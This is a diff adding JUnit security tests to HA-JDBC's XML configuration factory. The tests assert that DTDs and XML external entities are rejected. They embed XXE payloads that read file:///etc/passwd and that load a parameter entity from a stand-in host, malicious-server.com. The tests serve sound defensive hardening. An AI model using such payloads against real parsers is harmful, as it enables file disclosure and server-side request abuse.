@@ -18,6 +18,7 @@
 package net.sf.hajdbc.xml;
 
 import static org.assertj.core.api.Assertions.assertThat;
+import static org.assertj.core.api.Assertions.assertThatThrownBy;
 import static org.mockito.Mockito.mock;
 import static org.mockito.Mockito.reset;
 import static org.mockito.Mockito.when;
@@ -202,5 +203,74 @@ public class XMLDatabaseClusterConfigurationFactoryTest
 		System.out.println(writer.toString());
 		
 		return configuration;
+	}
+	
+	@Test
+	public void shouldRejectXMLEntity()
+	{
+		// XXE攻撃: 外部エンティティを含むXML
+		String xxeXml = "<?xml version=\"1.0\"?>\n"
+			+ "<!DOCTYPE ha-jdbc [\n"
+			+ "  <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
+			+ "]>\n"
+			+ "<ha-jdbc xmlns=\"" + Namespace.CURRENT_VERSION.getURI() + "\">\n"
+			+ "  <cluster default-sync=\"diff\">\n"
+			+ "    <database id=\"db1\" location=\"jdbc:h2:mem:test\">\n"
+			+ "      &xxe;\n"
+			+ "    </database>\n"
+			+ "  </cluster>\n"
+			+ "</ha-jdbc>";
+		
+		assertThatThrownBy(() -> createConfigurationWithXml(new DriverDatabaseClusterConfigurationBuilder(), xxeXml))
+			.isInstanceOf(SQLException.class);
+	}
+	
+	@Test
+	public void shouldRejectDTD()
+	{
+		// DTDを含むXML（外部エンティティなしでもDTD自体が拒否される）
+		String dtdXml = "<?xml version=\"1.0\"?>\n"
+			+ "<!DOCTYPE ha-jdbc [\n"
+			+ "  <!ELEMENT ha-jdbc (cluster)>\n"
+			+ "  <!ELEMENT cluster (database+)>\n"
+			+ "  <!ELEMENT database (property*)>\n"
+			+ "  <!ATTLIST database id CDATA #REQUIRED>\n"
+			+ "  <!ATTLIST database location CDATA #REQUIRED>\n"
+			+ "]>\n"
+			+ "<ha-jdbc xmlns=\"" + Namespace.CURRENT_VERSION.getURI() + "\">\n"
+			+ "  <cluster default-sync=\"diff\">\n"
+			+ "    <database id=\"db1\" location=\"jdbc:h2:mem:test\"/>\n"
+			+ "  </cluster>\n"
+			+ "</ha-jdbc>";
+		
+		assertThatThrownBy(() -> createConfigurationWithXml(new DriverDatabaseClusterConfigurationBuilder(), dtdXml))
+			.isInstanceOf(SQLException.class);
+	}
+	
+	@Test
+	public void shouldRejectXXEWithParameterEntity()
+	{
+		// パラメータエンティティを使ったXXE攻撃
+		String xxeXml = "<?xml version=\"1.0\"?>\n"
+			+ "<!DOCTYPE ha-jdbc [\n"
+			+ "  <!ENTITY % xxe SYSTEM \"http://malicious-server.com/payload\">\n"
+			+ "  %xxe;\n"
+			+ "]>\n"
+			+ "<ha-jdbc xmlns=\"" + Namespace.CURRENT_VERSION.getURI() + "\">\n"
+			+ "  <cluster default-sync=\"diff\">\n"
+			+ "    <database id=\"db1\" location=\"jdbc:h2:mem:test\"/>\n"
+			+ "  </cluster>\n"
+			+ "</ha-jdbc>";
+		
+		assertThatThrownBy(() -> createConfigurationWithXml(new DriverDatabaseClusterConfigurationBuilder(), xxeXml))
+			.isInstanceOf(SQLException.class);
+	}
+	
+	private static <Z, D extends Database<Z>, B extends DatabaseBuilder<Z, D>> DatabaseClusterConfiguration<Z, D> createConfigurationWithXml(DatabaseClusterConfigurationBuilder<Z, D, B> configurationBuilder, String xml) throws SQLException
+	{
+		XMLStreamFactory streamFactory = mock(XMLStreamFactory.class);
+		XMLDatabaseClusterConfigurationFactory<Z, D> factory = new XMLDatabaseClusterConfigurationFactory<>(streamFactory);
+		when(streamFactory.createSource()).thenReturn(new StreamSource(new StringReader(xml)));
+		return factory.createConfiguration(configurationBuilder);
 	}
 }
